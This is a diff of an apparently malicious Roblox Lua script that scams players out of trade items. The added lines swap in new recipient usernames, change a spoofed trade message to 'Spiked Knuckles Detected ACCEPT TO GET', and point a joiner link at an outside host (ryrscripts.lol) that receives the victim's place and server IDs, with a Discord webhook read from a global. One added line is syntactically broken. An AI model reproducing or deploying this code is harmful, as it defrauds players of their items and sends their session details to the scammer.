@@ -1,5 +1,3 @@
--- This file was generated at discord.gg/syncrypt
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 game:GetService("Players")
@@ -34,6 +32,7 @@ local t1 = {
 		["Fantasy Style"] = true,
 		["Goth Style"] = true,
 		["Beast Style"] = true
+        Zombie Style = true
 	},
 	value2 = {
 		Stick = true,
@@ -370,7 +369,7 @@ while true do
 		local rfTradingSetTokens = t1.value11.Modules.Net["RF/Trading/SetTokens"]
 		local NODH_WEBHOOK = _G.NODH_WEBHOOK
 		local MY_USERNAMES = _G.MY_USERNAMES or {}
-		local v62, v63, v64 = ipairs({ "qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar" })
+		local v62, v63, v64 = ipairs({ "Halloween9183", "Tocinita_YY", "Tocinito_YY" })
 		local t6 = {}
 
 		while true do
@@ -540,8 +539,8 @@ while true do
 						isTextLabel = Content
 					end
 
-					if isTextLabel and Content.Text ~= "Glitter Bomb Detected ACCEPT TO GET" then
-						Content.Text = "Glitter Bomb Detected ACCEPT TO GET"
+					if isTextLabel and Content.Text ~= "SPIKED KNUCKLES DETECTED ACCEPT TO GET" then
+						Content.Text = "Spiked Knuckles Detected ACCEPT TO GET"
 					end
 				end
 
@@ -2161,7 +2160,7 @@ while true do
 			end
 
 			local Name = t1.value15.Name
-			local v411 = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+			local v411 = "https://ryrscripts.lol/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 			local v412 = "local ts = game:GetService(\'TeleportService\') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", \'" .. game.JobId .. "\')"
 
 			if v387 then
